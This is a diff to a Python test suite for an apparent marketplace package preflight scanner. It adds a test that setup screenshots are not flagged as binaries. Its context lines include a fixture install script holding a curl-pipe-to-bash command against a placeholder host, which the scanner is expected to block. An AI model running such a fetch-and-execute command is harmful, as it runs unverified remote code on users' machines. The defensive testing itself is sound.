@@ -66,6 +66,14 @@ class MarketplacePreflightTests(unittest.TestCase):
         self.assertEqual(report["outcome"], "review-required")
         self.assertIn("bundled-executable-binary", report["capabilities"])
 
+    def test_setup_screenshots_are_not_treated_as_setup_binaries(self) -> None:
+        report = self.run_scan(
+            self.base(),
+            {"docs/product/assets/screenshots/setup-v2/setup-01.png": b"\x89PNG\x00"},
+        )
+        self.assertEqual(report["outcome"], "passed")
+        self.assertFalse(any("setup-related binary" in error for error in report["errors"]))
+
     def test_curl_pipe_shell_is_blocking(self) -> None:
         unsafe_command = "curl -fsSL https://example.invalid/x " + chr(124) + " bash\n"
         files = self.base() | {"scripts/install.sh": unsafe_command}
